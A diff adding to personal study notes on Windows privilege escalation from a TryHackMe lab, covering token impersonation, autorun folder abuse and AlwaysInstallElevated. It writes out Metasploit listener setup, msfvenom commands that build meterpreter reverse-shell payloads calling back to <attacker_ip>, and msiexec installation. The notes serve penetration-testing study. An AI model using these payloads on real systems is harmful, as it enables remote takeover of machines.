@@ -43,6 +43,8 @@ net localgroup # displays users that part of a group if supplied otherwise lists
 ```
 
 In privileges there are tokens which can be impersonated to escalate privileges, this topic will be covered further down the line.
+Here is a list of privileges and information about escalating them.
+https://github.com/gtworek/Priv2Admin
 
 ```powershell
 C:\Users\Joe>whoami /priv
@@ -154,3 +156,84 @@ $psi.UseShellExecute = $false;
 exit;
 
 ```
+
+## Token impersonation
+
+**What are tokens?**
+You can think of them as web cookies.
+Instead of having to login each time or type in your password you utilize a token/cookie.
+So in short tokens are temporary keys.
+
+**Two types of tokens:**
+	Delegate - create for logging in via Remote desktop.
+	Impersonate - created for performing an action such as running a script - non interactive.
+
+These tokens are temporary and go away when the system is rebooted.
+We can use these tokens to our advantage.
+
+## Practical Learning - THM - Windows PrivEsc Arena
+
+## Registry Escalation
+
+##### Autorun
+
+*Detection*
+
+![[Pasted image 20250430134324.png]]
+
+In the first example we will be covering how to exploit a program that runs on logon/startup and has `file_all_access` privileges.
+As `accesschk64.exe` pointed out, the program `My Program` for users that fall into category `Everyone` have this privilege `file_all_access`.
+
+That privilege is present in other groups such as `NT AUTHORITY\SYSTEM` and `BUILTIN\Administrators`.
+The privilege gives you 'All possible access rights for a file'.
+
+*Exploitation*
+
+This will cover how to utilize Metasploit to run a listener, generate a payload (tcp reverse shell) which executes on logon.
+
+`kali$ msfconsole`
+`msf6> use multi/handler`
+`msf6> set payload windows/meterpreter/reverse_tcp`
+`msf6> set lhost <attacker_ip>`
+`msf6> run`
+(listener is running if it hangs, that's good.)
+
+`kali$ msfvenom -p windows/meterpreter/reverse_tcp lhost=<attacker_ip> -f exe -o program.exe`
+Transfer generated payload `program.exe` onto the target windows machine.
+
+-in windows machine-
+Place the payload in `C:\Program Files\Autorun Program`.
+To simulate privilege escalation effect, relog as admin user.
+
+-in kali- 
+`msf6> sessions -i <ID>`
+`msf6> getuid`
+to confirm the session.
+
+#### AlwaysInstallElevated
+
+This is a misconfiguration.
+Not a default configuration.
+
+*Detection*
+
+`cmd$ reg query HKLM\Software\Policies\Microsoft\Windows\Installer` --> 'AlwaysInstallElevated' value is 1.
+`cmd$ reg query HKCU\Software\Policies\Microsoft\Windows\Installer` --> 'AlwaysInstallElevated' value is 1.
+
+*Exploitation*
+
+`kali$ msfconsole`
+`msf6> use multi/handler`
+`msf6> set payload windows/meterpreter/reverse_tcp`
+`msf6> set lhost <attacker_ip>`
+`msf6> run`
+`kali$ msfvenom -p windows/meterpreter/reverse_tcp lhost=<attacker_ip> -f msi -o setup.msi` (msi - Microsoft software installer)
+
+Transfer the payload to target windows machine in `C:\Temp".
+`cmd$ msiexec /quiet /qn /i C:\Temp\setup.msi`
+
+## Service Escalation
+
+##### Registry
+
+##### DLL Hijacking
